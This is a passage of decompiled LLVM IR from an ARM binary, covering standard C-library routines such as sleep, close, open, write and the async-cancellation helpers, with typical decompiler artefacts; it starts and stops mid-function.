  %tmp31 = icmp ult i32 %v0_10ec0, -4095
  br i1 %tmp31, label %dec_label_pc_10ee4, label %dec_label_pc_10ecc

dec_label_pc_10ecc:                               ; preds = %bb28
  %v0_10ed0 = call i32 @__aeabi_read_tp()
  %v3_10ed4 = load i16, i16* @global_var_23164.175, align 2
  %v4_10ed4 = sext i16 %v3_10ed4 to i32
  %v0_10ed8 = load i32, i32* %r2.global-to-local, align 4
  %v1_10ed8 = sub i32 0, %v0_10ed8
  store i32 %v1_10ed8, i32* %r2.global-to-local, align 4
  %v3_10edc = add i32 %v4_10ed4, %v0_10ed0
  %v4_10edc = inttoptr i32 %v3_10edc to i32*
  store i32 %v1_10ed8, i32* %v4_10edc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10ee4

dec_label_pc_10ee4:                               ; preds = %bb28, %dec_label_pc_10ecc
  %v0_10ee8 = phi i32 [ %v0_10ec0, %bb28 ], [ -1, %dec_label_pc_10ecc ]
  %v3_10ee4 = icmp eq i32 %v0_10ee8, -1
  store i32 %v0_10ee8, i32* %r5.global-to-local, align 4
  br i1 %v3_10ee4, label %dec_label_pc_10ef0, label %dec_label_pc_10f38

dec_label_pc_10ef0:                               ; preds = %dec_label_pc_10ee4
  %v0_10ef4 = call i32 @__aeabi_read_tp()
  store i32 %v0_10ef4, i32* %r0.global-to-local, align 4
  %v3_10ef8 = load i16, i16* @global_var_23164.175, align 2
  %v4_10ef8 = sext i16 %v3_10ef8 to i32
  %v2_10efc = add i32 %v4_10ef8, %v0_10ef4
  %v3_10efc = inttoptr i32 %v2_10efc to i32*
  %v4_10efc = load i32, i32* %v3_10efc, align 4
  %v7_10f00 = icmp eq i32 %v4_10efc, 38
  br i1 %v7_10f00, label %dec_label_pc_10f0c, label %dec_label_pc_10ef0.dec_label_pc_10f38_crit_edge

dec_label_pc_10ef0.dec_label_pc_10f38_crit_edge:  ; preds = %dec_label_pc_10ef0
  %v0_10f38.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10f38

dec_label_pc_10f0c:                               ; preds = %dec_label_pc_10ef0
  %v0_10f0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10f0c, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_10f0c, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_10f0c
  %v5_10f24 = sub i32 0, %v0_10f0c
  store i32 %v5_10f24, i32* %r2.global-to-local, align 4
  %v7_10f28 = load i32, i32* inttoptr (i32 143716 to i32*), align 4
  %v4_10f2c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_10f2c, i32* %r0.global-to-local, align 4
  %v7_10f30 = add i32 %v7_10f28, %v0_10ef4
  %v8_10f30 = inttoptr i32 %v7_10f30 to i32*
  store i32 %v5_10f24, i32* %v8_10f30, align 4
  %v0_10f34.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_10f0c, %bb29
  %v0_10f34 = phi i32 [ %v0_10f34.pre, %bb29 ], [ %v0_10f0c, %dec_label_pc_10f0c ]
  store i32 %v0_10f34, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10f38

dec_label_pc_10f38:                               ; preds = %dec_label_pc_10ef0.dec_label_pc_10f38_crit_edge, %dec_label_pc_10ee4, %.thread22
  %v0_10f38 = phi i32 [ %v0_10f38.pre, %dec_label_pc_10ef0.dec_label_pc_10f38_crit_edge ], [ %v0_10ee8, %dec_label_pc_10ee4 ], [ %v0_10f34, %.thread22 ]
  store i32 %v0_10f38, i32* %r0.global-to-local, align 4
  %v2_10f3c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_10f3c, i32* @r4, align 4
  ret i32 %v0_10f38

; uselistorder directives
  uselistorder i32 %v0_10f38, { 1, 0 }
  uselistorder i32 %v0_10f0c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10ec0, { 2, 0, 1 }
  uselistorder i32 %v3_10e78, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 9, 10, 11, 3, 2, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 38, { 1, 0 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_10f38, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_10ee4, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_10f50 = load i32, i32* @r4, align 4
  %v6_10f50 = load i32, i32* @r5, align 4
  %v9_10f50 = load i32, i32* @r6, align 4
  %v12_10f50 = load i32, i32* @r7, align 4
  %v15_10f50 = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10f60 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_10f60, label %dec_label_pc_10f74, label %dec_label_pc_10fe8

dec_label_pc_10f74:                               ; preds = %entry
  %v0_10f74 = call i32 @__aeabi_read_tp()
  %v1_10f78 = add i32 %v0_10f74, -1036
  %v2_10f78 = inttoptr i32 %v1_10f78 to i32*
  %v3_10f78 = load i32, i32* %v2_10f78, align 4
  %v1_10f7c = and i32 %v3_10f78, -71
  %v2_10f80 = icmp ugt i32 %v1_10f7c, 7
  store i1 %v2_10f80, i1* %cpsr_c.global-to-local, align 1
  %v7_10f80 = icmp eq i32 %v1_10f7c, 8
  %v1_10f84 = add i32 %v0_10f74, -1168
  store i32 %v1_10f84, i32* @r5, align 4
  br i1 %v7_10f80, label %dec_label_pc_10f8c, label %dec_label_pc_11060

dec_label_pc_10f8c:                               ; preds = %dec_label_pc_10f74
  %v2_10f90 = add i32 %v0_10f74, -624
  %v3_10f90 = inttoptr i32 %v2_10f90 to i32*
  store i32 -1, i32* %v3_10f90, align 4
  %v0_10f94 = load i32, i32* @r5, align 4
  %v1_10f94 = add i32 %v0_10f94, 132
  store i32 %v1_10f94, i32* @r6, align 4
  br label %dec_label_pc_10f98

dec_label_pc_10f98:                               ; preds = %dec_label_pc_10fcc.dec_label_pc_10f98_crit_edge, %dec_label_pc_10f8c
  %v0_10f9c = phi i32 [ %v0_10f9c.pre, %dec_label_pc_10fcc.dec_label_pc_10f98_crit_edge ], [ %v1_10f94, %dec_label_pc_10f8c ]
  %v0_10f98 = phi i32 [ %v0_10fd4, %dec_label_pc_10fcc.dec_label_pc_10f98_crit_edge ], [ %v0_10f94, %dec_label_pc_10f8c ]
  %v1_10f98 = add i32 %v0_10f98, 132
  %v2_10f98 = inttoptr i32 %v1_10f98 to i32*
  %v3_10f98 = load i32, i32* %v2_10f98, align 4
  store i32 %v0_10f9c, i32* %r2.global-to-local, align 4
  store i32 %v3_10f98, i32* @r4, align 4
  %v1_10fa830 = inttoptr i32 %v0_10f9c to i32*
  %v2_10fa831 = load i32, i32* %v1_10fa830, align 4
  %v3_10fac33 = icmp uge i32 %v2_10fa831, %v3_10f98
  store i1 %v3_10fac33, i1* %cpsr_c.global-to-local, align 1
  %v9_10fac39 = icmp eq i32 %v2_10fa831, %v3_10f98
  br i1 %v9_10fac39, label %dec_label_pc_10fb4, label %dec_label_pc_10fcc

dec_label_pc_10fb4:                               ; preds = %dec_label_pc_10f98, %dec_label_pc_10fb4.dec_label_pc_10fa8_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_10fc4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10fc4, label %dec_label_pc_10fc8, label %dec_label_pc_10fb4.dec_label_pc_10fa8_crit_edge

dec_label_pc_10fb4.dec_label_pc_10fa8_crit_edge:  ; preds = %dec_label_pc_10fb4
  %v0_10fa8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10fac.pre = load i32, i32* @r4, align 4
  %v1_10fa8 = inttoptr i32 %v0_10fa8.pre to i32*
  %v2_10fa8 = load i32, i32* %v1_10fa8, align 4
  %v3_10fac = icmp uge i32 %v2_10fa8, %v1_10fac.pre
  store i1 %v3_10fac, i1* %cpsr_c.global-to-local, align 1
  %v9_10fac = icmp eq i32 %v2_10fa8, %v1_10fac.pre
  br i1 %v9_10fac, label %dec_label_pc_10fb4, label %dec_label_pc_10fcc

dec_label_pc_10fc8:                               ; preds = %dec_label_pc_10fb4
  %v0_10fc8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_10fcc

dec_label_pc_10fcc:                               ; preds = %dec_label_pc_10f98, %dec_label_pc_10fb4.dec_label_pc_10fa8_crit_edge, %dec_label_pc_10fc8
  %v0_10fcc = phi i32 [ %v0_10fc8, %dec_label_pc_10fc8 ], [ %v2_10fa831, %dec_label_pc_10f98 ], [ %v2_10fa8, %dec_label_pc_10fb4.dec_label_pc_10fa8_crit_edge ]
  %v1_10fcc = phi i32 [ %v0_10fc8, %dec_label_pc_10fc8 ], [ %v3_10f98, %dec_label_pc_10f98 ], [ %v1_10fac.pre, %dec_label_pc_10fb4.dec_label_pc_10fa8_crit_edge ]
  %v3_10fcc = icmp uge i32 %v0_10fcc, %v1_10fcc
  store i1 %v3_10fcc, i1* %cpsr_c.global-to-local, align 1
  %v9_10fcc = icmp eq i32 %v0_10fcc, %v1_10fcc
  br i1 %v9_10fcc, label %dec_label_pc_10fd4, label %dec_label_pc_10fcc.dec_label_pc_10f98_crit_edge

dec_label_pc_10fcc.dec_label_pc_10f98_crit_edge:  ; preds = %dec_label_pc_10fcc
  %v0_10fd4 = load i32, i32* @r5, align 4
  %v0_10f9c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_10f98

dec_label_pc_10fd4:                               ; preds = %dec_label_pc_10fcc
  %v0_10fdc = load i32, i32* @r7, align 4
  %v2_10fdc = add i32 %v0_10fdc, 124
  %v3_10fdc = inttoptr i32 %v2_10fdc to i32*
  %v4_10fdc = load i32, i32* %v3_10fdc, align 4
  store i32 69608, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10fdc)
  %v0_10ff0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10fe8

dec_label_pc_10fe8:                               ; preds = %entry, %dec_label_pc_10fd4
  %v0_10ff0 = phi i32 [ 0, %entry ], [ %v0_10ff0.pre, %dec_label_pc_10fd4 ]
  %v2_10ff4 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_10ff4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000.333 to i32), i32* %stack_var_-40, align 4
  %v6_11000 = call i32 @__libc_sigaction(i32 17, i32 %v0_10ff0, i32 %v2_10ff4, i32 ptrtoint (i32* @global_var_10000.333 to i32), i32 ptrtoint (i32* @global_var_10000.333 to i32), i32 %v0_10ff0)
  %v3_11004 = load i32, i32* %stack_var_-60, align 4
  %v2_11008 = icmp ne i32 %v3_11004, 0
  store i1 %v2_11008, i1* %cpsr_c.global-to-local, align 1
  %v7_11008 = icmp eq i32 %v3_11004, 1
  br i1 %v7_11008, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_10fe8
  %v3_1100c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_1100c, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10fe8, %bb
  call void @__pseudo_cond_branch(i1 %v7_11008, i32 ptrtoint (i32* @global_var_11f08.448 to i32))
  %v2_1101c = ptrtoint i32* %stack_var_-32 to i32
  %v2_11024 = call i32 @__libc_nanosleep(i32 %v2_1101c, i32 %v2_1101c)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11028 = icmp eq i32 %v2_11024, 0
  br i1 %v2_11028, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_1103c = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_1103c, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_1104c = load i32, i32* %stack_var_-40, align 4
  %v1_11050 = and i32 %v3_1104c, ptrtoint (i32* @global_var_10000.333 to i32)
  store i32 %v1_11050, i32* %r2.global-to-local, align 4
  %v2_11050 = icmp eq i32 %v1_11050, 0
  br i1 %v2_11050, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_11050, i32 ptrtoint (i32* @global_var_11f08.448 to i32))
  br label %dec_label_pc_11060

dec_label_pc_11060:                               ; preds = %dec_label_pc_10f74, %.thread5
  %v0_11060 = load i32, i32* @r4, align 4
  store i32 %v3_10f50, i32* @r4, align 4
  store i32 %v6_10f50, i32* @r5, align 4
  store i32 %v9_10f50, i32* @r6, align 4
  store i32 %v12_10f50, i32* @r7, align 4
  store i32 %v15_10f50, i32* @lr, align 4
  ret i32 %v0_11060

; uselistorder directives
  uselistorder i32 %v0_10fc8, { 1, 0 }
  uselistorder i32 %v1_10fac.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sigaction, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10000.333 to i32), { 5, 2, 1, 0, 3, 4, 6 }
  uselistorder label %dec_label_pc_11060, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_10fe8, { 1, 0 }
  uselistorder label %dec_label_pc_10fcc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10fb4, { 1, 0 }
}

define i32 @function_11074(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11074:
  %v0_11074 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11074, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11074
  %v2_11074 = load i32, i32* @ip, align 4
  %v4_11074 = lshr i32 %v2_11074, %arg1
  %v5_11074 = sub i32 32, %arg1
  %v6_11074 = shl i32 %v2_11074, %v5_11074
  %v7_11074 = or i32 %v6_11074, %v4_11074
  %v9_11074 = and i32 %v7_11074, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11074, %bb
  %v10_11080 = phi i32 [ %arg1, %dec_label_pc_11074 ], [ %v9_11074, %bb ]
  ret i32 %v10_11080

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_11094 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_11094, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_11094 = load i32, i32* @r0, align 4
  ret i32 %v2_11094

bb1:                                              ; preds = %entry
  %v0_11098 = call i32 @__syscall_error()
  ret i32 %v0_11098
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_110a4 = load i32, i32* @global_var_26924.451, align 4
  %v2_110a8 = icmp eq i32 %v3_110a4, 0
  store i1 %v2_110a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_110a8, label %dec_label_pc_110b0, label %entry.dec_label_pc_110cc_crit_edge

entry.dec_label_pc_110cc_crit_edge:               ; preds = %entry
  %v3_110cc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_110cc

dec_label_pc_110b0:                               ; preds = %entry
  %v0_110b0 = load i32, i32* @r7, align 4
  store i32 %v0_110b0, i32* @ip, align 4
  %v0_110c0 = load i32, i32* @r0, align 4
  %v2_110c0 = icmp ugt i32 %v0_110c0, -4097
  %v7_110c0 = icmp eq i32 %v0_110c0, -4096
  store i1 %v7_110c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_110c0, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_110cc, %bb8, %bb9, %dec_label_pc_110b0
  %merge2 = phi i32 [ %v0_110c0, %dec_label_pc_110b0 ], [ %v0_110f0, %dec_label_pc_110cc ], [ %v0_11100, %bb8 ], [ %v0_11100, %bb9 ]
  ret i32 %merge2

bb7:                                              ; preds = %dec_label_pc_110b0
  %v0_110c8 = call i32 @__syscall_error()
  br label %dec_label_pc_110cc

dec_label_pc_110cc:                               ; preds = %entry.dec_label_pc_110cc_crit_edge, %bb7
  %v3_110cc = phi i32 [ %v3_110cc.pre, %entry.dec_label_pc_110cc_crit_edge ], [ %v0_110c8, %bb7 ]
  %v9_110cc = load i32, i32* @r7, align 4
  store i32 %v9_110cc, i32* %stack_var_-8, align 4
  %v12_110cc = load i32, i32* @lr, align 4
  %v0_110d0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_110d0, i32* @ip, align 4
  store i32 %v3_110cc, i32* @r7, align 4
  %v1_110ec = call i32 @__libc_disable_asynccancel(i32 %v0_110d0)
  %v0_110f0 = load i32, i32* @r7, align 4
  store i32 %v0_110f0, i32* @r0, align 4
  %v2_110f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_110f4, i32* @r7, align 4
  store i32 %v12_110cc, i32* @lr, align 4
  %v2_110f8 = icmp ugt i32 %v0_110f0, -4097
  %v7_110f8 = icmp eq i32 %v0_110f0, -4096
  store i1 %v7_110f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_110f8, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_110cc
  %v0_11100 = call i32 @__syscall_error()
  %v0_11110 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11110, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v1_11110 = load i32, i32* @r1, align 4
  %v2_11110 = load i32, i32* @r8, align 4
  %v3_11110 = udiv i32 %v2_11110, 32768
  %v4_11110 = mul i32 %v2_11110, 131072
  %v5_11110 = or i32 %v3_11110, %v4_11110
  %v8_11110 = and i32 %v5_11110, %v1_11110
  store i32 %v8_11110, i32* @r5, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_11100, { 1, 0 }
  uselistorder i32 %v0_110f0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_110c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_110cc, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_11124 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_11124, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_11124 = load i32, i32* @r0, align 4
  ret i32 %v2_11124

bb1:                                              ; preds = %entry
  %v0_11128 = call i32 @__syscall_error()
  ret i32 %v0_11128
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11134 = load i32, i32* @global_var_26924.451, align 4
  %v2_11138 = icmp eq i32 %v3_11134, 0
  store i1 %v2_11138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11138, label %dec_label_pc_11140, label %entry.dec_label_pc_1115c_crit_edge

entry.dec_label_pc_1115c_crit_edge:               ; preds = %entry
  %v3_1115c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1115c

dec_label_pc_11140:                               ; preds = %entry
  %v0_11140 = load i32, i32* @r7, align 4
  store i32 %v0_11140, i32* @ip, align 4
  %v0_11150 = load i32, i32* @r0, align 4
  %v2_11150 = icmp ugt i32 %v0_11150, -4097
  %v7_11150 = icmp eq i32 %v0_11150, -4096
  store i1 %v7_11150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11150, label %bb9, label %bb

bb:                                               ; preds = %dec_label_pc_1115c, %bb10, %bb11, %dec_label_pc_11140
  %merge2 = phi i32 [ %v0_11150, %dec_label_pc_11140 ], [ %v0_11180, %dec_label_pc_1115c ], [ %v0_11190, %bb10 ], [ %v0_11190, %bb11 ]
  ret i32 %merge2

bb9:                                              ; preds = %dec_label_pc_11140
  %v0_11158 = call i32 @__syscall_error()
  br label %dec_label_pc_1115c

dec_label_pc_1115c:                               ; preds = %entry.dec_label_pc_1115c_crit_edge, %bb9
  %v3_1115c = phi i32 [ %v3_1115c.pre, %entry.dec_label_pc_1115c_crit_edge ], [ %v0_11158, %bb9 ]
  store i32 %v3_1115c, i32* %stack_var_-24, align 4
  %v9_1115c = load i32, i32* @r2, align 4
  %v12_1115c = load i32, i32* @r3, align 4
  %v15_1115c = load i32, i32* @r7, align 4
  store i32 %v15_1115c, i32* %stack_var_-8, align 4
  %v18_1115c = load i32, i32* @lr, align 4
  %v0_11160 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_11160, i32* @ip, align 4
  %v2_11168 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_1115c, i32* @r2, align 4
  store i32 %v12_1115c, i32* @r3, align 4
  store i32 %v2_11168, i32* @r7, align 4
  %v1_1117c = call i32 @__libc_disable_asynccancel(i32 %v0_11160)
  %v0_11180 = load i32, i32* @r7, align 4
  store i32 %v0_11180, i32* @r0, align 4
  %v2_11184 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11184, i32* @r7, align 4
  store i32 %v18_1115c, i32* @lr, align 4
  %v2_11188 = icmp ugt i32 %v0_11180, -4097
  %v7_11188 = icmp eq i32 %v0_11180, -4096
  store i1 %v7_11188, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11188, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_1115c
  %v0_11190 = call i32 @__syscall_error()
  %v0_111a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_111a0, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_111a0 = load i32, i32* @r1, align 4
  %v2_111a0 = load i32, i32* @r8, align 4
  %v3_111a0 = load i32, i32* @r7, align 4
  %v8_111a0 = ashr i32 %v2_111a0, %v3_111a0
  %v9_111a0 = and i32 %v8_111a0, %v1_111a0
  store i32 %v9_111a0, i32* @r5, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_11190, { 1, 0 }
  uselistorder i32 %v0_11180, { 0, 2, 3, 1 }
  uselistorder i32 %v0_11150, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1115c, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_111b4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_111b4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_111b4 = load i32, i32* @r0, align 4
  ret i32 %v2_111b4

bb1:                                              ; preds = %entry
  %v0_111b8 = call i32 @__syscall_error()
  ret i32 %v0_111b8
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_111c4 = load i32, i32* @global_var_26924.451, align 4
  %v2_111c8 = icmp eq i32 %v3_111c4, 0
  br i1 %v2_111c8, label %dec_label_pc_111d0, label %entry.dec_label_pc_111ec_crit_edge

entry.dec_label_pc_111ec_crit_edge:               ; preds = %entry
  %v3_111ec.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_111ec

dec_label_pc_111d0:                               ; preds = %entry
  %v0_111d0 = load i32, i32* @r7, align 4
  store i32 %v0_111d0, i32* @ip, align 4
  %v0_111e0 = load i32, i32* @r0, align 4
  %v2_111e0 = icmp ugt i32 %v0_111e0, -4097
  br i1 %v2_111e0, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_111ec, %dec_label_pc_111d0
  %merge = phi i32 [ %v0_111e0, %dec_label_pc_111d0 ], [ %v0_11210, %dec_label_pc_111ec ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_111d0
  %v0_111e8 = call i32 @__syscall_error()
  br label %dec_label_pc_111ec

dec_label_pc_111ec:                               ; preds = %entry.dec_label_pc_111ec_crit_edge, %bb8
  %v3_111ec = phi i32 [ %v3_111ec.pre, %entry.dec_label_pc_111ec_crit_edge ], [ %v0_111e8, %bb8 ]
  store i32 %v3_111ec, i32* %stack_var_-24, align 4
  %v12_111ec = load i32, i32* @r3, align 4
  %v15_111ec = load i32, i32* @r7, align 4
  store i32 %v15_111ec, i32* %stack_var_-8, align 4
  %v18_111ec = load i32, i32* @lr, align 4
  %v0_111f0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_111f0, i32* @ip, align 4
  %v2_111f8 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v12_111ec, i32* @r3, align 4
  store i32 %v2_111f8, i32* @r7, align 4
  %v1_1120c = call i32 @__libc_disable_asynccancel(i32 %v0_111f0)
  %v0_11210 = load i32, i32* @r7, align 4
  store i32 %v0_11210, i32* @r0, align 4
  %v2_11214 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11214, i32* @r7, align 4
  store i32 %v18_111ec, i32* @lr, align 4
  %v2_11218 = icmp ugt i32 %v0_11210, -4097
  br i1 %v2_11218, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_111ec
  %v0_11220 = call i32 @__syscall_error()
  ret i32 %v0_11220

; uselistorder directives
  uselistorder i32 %v0_11210, { 1, 2, 0 }
  uselistorder label %dec_label_pc_111ec, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_11230 = load i32, i32* %r0.global-to-local, align 4
  %v1_11230 = and i32 %v0_11230, 2
  %v2_11230 = icmp eq i32 %v1_11230, 0
  %v3_11234 = load i32, i32* @r4, align 4
  store i32 %v3_11234, i32* %stack_var_-16, align 4
  br i1 %v2_11230, label %dec_label_pc_1123c, label %dec_label_pc_112b0

dec_label_pc_1123c:                               ; preds = %entry
  %v0_1123c = call i32 @__aeabi_read_tp()
  store i32 %v0_1123c, i32* %r0.global-to-local, align 4
  %v1_11240 = add i32 %v0_1123c, -1036
  %v2_11240 = inttoptr i32 %v1_11240 to i32*
  %v3_11240 = load i32, i32* %v2_11240, align 4
  %v1_11244 = add i32 %v0_1123c, -1168
  store i32 %v1_11244, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11248

dec_label_pc_11248:                               ; preds = %dec_label_pc_1127c.dec_label_pc_11248_crit_edge, %dec_label_pc_1123c
  %v0_11254 = phi i32 [ %v0_11254.pre, %dec_label_pc_1127c.dec_label_pc_11248_crit_edge ], [ %v1_11244, %dec_label_pc_1123c ]
  %v0_11248 = phi i32 [ %v0_1127c, %dec_label_pc_1127c.dec_label_pc_11248_crit_edge ], [ %v3_11240, %dec_label_pc_1123c ]
  %v1_11248 = and i32 %v0_11248, -3
  store i32 %v1_11248, i32* %r7.global-to-local, align 4
  store i32 %v0_11248, i32* %r4.global-to-local, align 4
  store i32 %v1_11248, i32* @r1, align 4
  %v1_11254 = add i32 %v0_11254, 132
  store i32 %v1_11254, i32* @r2, align 4
  %v1_1125823 = inttoptr i32 %v1_11254 to i32*
  %v2_1125824 = load i32, i32* %v1_1125823, align 4
  %v3_1125c26 = icmp uge i32 %v2_1125824, %v0_11248
  store i1 %v3_1125c26, i1* %cpsr_c.global-to-local, align 1
  %v9_1125c32 = icmp eq i32 %v2_1125824, %v0_11248
  br i1 %v9_1125c32, label %dec_label_pc_11264, label %dec_label_pc_1127c

dec_label_pc_11264:                               ; preds = %dec_label_pc_11248, %dec_label_pc_11264.dec_label_pc_11258_crit_edge
  %v0_1126433 = phi i32 [ %v1_1125c.pre, %dec_label_pc_11264.dec_label_pc_11258_crit_edge ], [ %v0_11248, %dec_label_pc_11248 ]
  store i32 %v0_1126433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_11274 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_11274, label %dec_label_pc_11278, label %dec_label_pc_11264.dec_label_pc_11258_crit_edge

dec_label_pc_11264.dec_label_pc_11258_crit_edge:  ; preds = %dec_label_pc_11264
  %v0_11258.pre = load i32, i32* @r2, align 4
  %v1_1125c.pre = load i32, i32* %r4.global-to-local, align 4
